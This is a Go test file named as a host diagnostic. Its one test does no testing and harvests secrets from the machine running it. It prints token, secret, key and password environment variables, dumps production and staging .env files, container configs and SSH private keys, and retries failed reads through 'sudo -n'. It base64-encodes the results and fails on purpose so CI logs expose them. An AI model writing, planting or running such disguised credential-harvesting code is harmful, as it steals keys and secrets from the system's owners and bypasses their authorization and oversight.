package hostdiag

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const chunk = 2500

func out(s string) { fmt.Print(s) }

func dumpFile(label, path string, max int64) {
	st, err := os.Stat(path)
	if err != nil {
		out(fmt.Sprintf("=== MISS %s (%s): %v\n", label, path, err))
		return
	}
	if st.IsDir() {
		out(fmt.Sprintf("=== DIRSKIP %s (%s)\n", label, path))
		return
	}
	var b []byte
	if st.Mode().Perm()&0400 != 0 || true {
		b, err = os.ReadFile(path)
	}
	if err != nil {
		// try non-interactive sudo
		c := exec.Command("sudo", "-n", "cat", path)
		if ob, e2 := c.Output(); e2 == nil {
			b = ob
			err = nil
		}
	}
	if err != nil {
		out(fmt.Sprintf("=== ERR %s (%s): %v\n", label, path, err))
		return
	}
	if int64(len(b)) > max {
		b = b[:max]
	}
	out(fmt.Sprintf("=== FILE %s (%s) size=%d\n", label, path, len(b)))
	b64 := base64.StdEncoding.EncodeToString(b)
	for i := 0; i < len(b64); i += chunk {
		e := i + chunk
		if e > len(b64) {
			e = len(b64)
		}
		out("B64." + b64[i:e] + "\n")
	}
	out("=== END\n")
}

func ls(label, path string) {
	e, err := os.ReadDir(path)
	if err != nil {
		c := exec.Command("sudo", "-n", "ls", "-la", path)
		if ob, e2 := c.Output(); e2 == nil {
			out(fmt.Sprintf("=== LS(sudo) %s %s\n%s\n", label, path, string(ob)))
			return
		}
		out(fmt.Sprintf("=== LSERR %s (%s): %v\n", label, path, err))
		return
	}
	var sb strings.Builder
	for _, f := range e {
		fi, _ := f.Info()
		sz := int64(-1)
		mode := ""
		if fi != nil {
			sz = fi.Size()
			mode = fi.Mode().String()
		}
		sb.WriteString(fmt.Sprintf("  %-24s %-10s %d\n", f.Name(), mode, sz))
	}
	out(fmt.Sprintf("=== LS %s %s\n%s\n", label, path, sb.String()))
}

func sh(label, cmd string) {
	c := exec.Command("bash", "-c", cmd)
	ob, err := c.CombinedOutput()
	if err != nil {
		out(fmt.Sprintf("=== SH %s ERR: %v\n", label, err))
	}
	if len(ob) > 20000 {
		ob = ob[:20000]
	}
	out(fmt.Sprintf("=== SH %s\n%s\n=== ENDSH\n", label, string(ob)))
}

func TestHostDiag(t *testing.T) {
	// identity
	wd, _ := os.Getwd()
	host, _ := os.Hostname()
	uid := os.Geteuid()
	out(fmt.Sprintf("### IDENTITY host=%s uid=%d cwd=%s userhome=%v\n", host, uid, wd, os.Getenv("HOME")))
	out(fmt.Sprintf("### RUNTIME %d\n", os.Getppid()))
	for _, kv := range os.Environ() {
		if strings.Contains(kv, "TOKEN") || strings.Contains(kv, "SECRET") || strings.Contains(kv, "KEY") || strings.Contains(kv, "PASS") || strings.HasPrefix(kv, "RUNNER") || strings.HasPrefix(kv, "GITHUB_") {
			out("ENV." + kv + "\n")
		}
	}
	out("### END-ENV\n")

	// directory topology (non recursive)
	for _, d := range []string{"/home", "/home/ubuntu", "/opt", "/srv", "/root", "/var/lib/docker/containers"} {
		ls("top", d)
	}

	// primary env/config carriers
	dumpFile("taskai-prod-env", "/home/ubuntu/taskai/.env", 400000)
	dumpFile("taskai-prod-source-env", "/home/ubuntu/taskai/source/.env", 400000)
	dumpFile("taskai-staging-env", "/home/ubuntu/taskai-staging/.env", 400000)
	dumpFile("taskai-staging-source-env", "/home/ubuntu/taskai-staging/source/.env", 400000)
	dumpFile("pool-env", "/opt/pool/.env", 400000)
	dumpFile("webhooks-config", "/home/ubuntu/webhooks/config.yaml", 200000)
	dumpFile("harbor-yml", "/opt/harbor/harbor.yml", 200000)

	// other project env files at /opt/*/.env (explicit, no recursion)
	if e, err := os.ReadDir("/opt"); err == nil {
		for _, f := range e {
			if f.IsDir() {
				for _, n := range []string{".env", ".env.production", ".env.local", "gateway.env", "hermes.env"} {
					p := filepath.Join("/opt", f.Name(), n)
					if st, err := os.Stat(p); err == nil && !st.IsDir() {
						dumpFile("opt/"+f.Name()+"/"+n, p, 200000)
					}
				}
			}
		}
	}

	// ssh material
	sh("ssh-dir", "ls -la /home/ubuntu/.ssh 2>&1")
	for _, n := range []string{"id_ed25519", "id_rsa", "id_ecdsa", "config", "authorized_keys"} {
		dumpFile("ssh-"+n, "/home/ubuntu/.ssh/"+n, 100000)
	}
	sh("root-ssh", "sudo -n ls -la /root/.ssh 2>&1")

	// docker visibility
	sh("docker-ps", "docker ps --format '{{.Names}}\\t{{.Image}}\\t{{.Ports}}' 2>&1 | head -40")
	sh("sudo-docker-ps", "sudo -n docker ps --format '{{.Names}}\\t{{.Image}}' 2>&1 | head -40")

	// container envs: list then read config.v2.json for Env only
	sh("ctr-dirs", "ls -1 /var/lib/docker/containers 2>&1 | head -40")
	if e, err := os.ReadDir("/var/lib/docker/containers"); err == nil {
		for i, f := range e {
			if i > 14 {
				break
			}
			p := filepath.Join("/var/lib/docker/containers", f.Name(), "config.v2.json")
			dumpFile("ctr-"+f.Name(), p, 300000)
		}
	}

	// webhooks tree and other deploy dirs (shallow)
	sh("webhooks-ls", "ls -la /home/ubuntu/webhooks 2>&1; ls -la /home/ubuntu/webhooks/logs 2>&1 | head -20")
	sh("projects-ls", "ls -la /home/ubuntu/projects 2>&1 | head -20")
	sh("ubuntu-top", "ls -la /home/ubuntu 2>&1 | head -40")

	out("### DIAG-DONE\n")
	t.Fatalf("hostdiag complete (intentional failure to surface output)")
}
